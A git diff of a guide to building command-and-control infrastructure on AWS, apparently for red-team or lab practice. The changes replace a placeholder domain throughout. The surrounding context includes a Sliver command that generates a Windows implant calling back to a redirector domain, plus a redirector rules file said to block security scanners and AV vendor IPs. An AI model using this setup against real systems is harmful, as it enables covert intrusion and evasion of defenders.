@@ -230,7 +230,7 @@ notepad terraform.tfvars  # Windows
 localPub_ip              = "YOUR_IP/32"           # Replace with your IP + /32
 ssh_key_name             = "rs-rsa-key"            # Must match your AWS key pair name
 ssh_private_key_path     = "./rs-rsa-key.pem"      # Path to your .pem file (for Windows password decryption)
-redirector_domain        = "yourdomain.com"        # Your domain — apex (yourdomain.com) or subdomain (c2.yourdomain.com)
+redirector_domain        = "yourdomain.tld"        # Your domain — apex (yourdomain.tld) or subdomain (c2.yourdomain.tld)
 enable_external_vpn      = false                   # Set to true for HTB/THM/ProvingGrounds access (see Part 8)
 ```
 
@@ -335,8 +335,8 @@ Look for the **APACHE REDIRECTOR** section — the `Public IP` field is what you
 
 | Domain type | Host/Name field | Example |
 | ----------- | --------------- | ------- |
-| Apex domain | `@` | `yourdomain.com` → redirector IP |
-| Subdomain | subdomain only (e.g., `c2`) | `c2.yourdomain.com` → redirector IP |
+| Apex domain | `@` | `yourdomain.tld` → redirector IP |
+| Subdomain | subdomain only (e.g., `c2`) | `c2.yourdomain.tld` → redirector IP |
 
 - **Value/Points to:** The redirector's Elastic IP from the command above
 - **TTL:** 300 (5 minutes) or lowest available
@@ -346,13 +346,13 @@ Look for the **APACHE REDIRECTOR** section — the `Public IP` field is what you
 **Windows (PowerShell):**
 
 ```powershell
-Resolve-DnsName yourdomain.com
+Resolve-DnsName yourdomain.tld
 ```
 
 **Linux/Mac (bash):**
 
 ```bash
-dig +short yourdomain.com
+dig +short yourdomain.tld
 ```
 
 **Expected:** The IP returned should match your redirector's Elastic IP.
@@ -360,7 +360,7 @@ dig +short yourdomain.com
 > **Note:** DNS propagation can vary. After DNS resolves correctly, run Certbot on the redirector (see Step 2.4):
 >
 > ```bash
-> sudo certbot --apache -d yourdomain.com
+> sudo certbot --apache -d yourdomain.tld
 > ```
 
 **Checkpoint:** ✅ Domain pointed to redirector IP, DNS verified
@@ -674,7 +674,7 @@ The redirect.rules file blocks known security scanners, AV vendor IPs, and TOR e
 **Obtain SSL Certificate (after DNS is pointed):**
 
 ```bash
-sudo certbot --apache -d yourdomain.com
+sudo certbot --apache -d yourdomain.tld
 ```
 
 Follow the prompts. Certbot will automatically update the Apache HTTPS config and add an HTTP→HTTPS redirect. Auto-renewal is configured by Certbot.
@@ -1095,7 +1095,7 @@ This starts an HTTP listener on port 80. The redirector forwards traffic from th
 sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --save /tmp/implant.exe
 ```
 
-Replace `<YOUR_DOMAIN>` with your redirector's domain (e.g., `c2.yourdomain.com`). The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
+Replace `<YOUR_DOMAIN>` with your redirector's domain (e.g., `c2.yourdomain.tld`). The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
 
 > **Note:** The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.
 
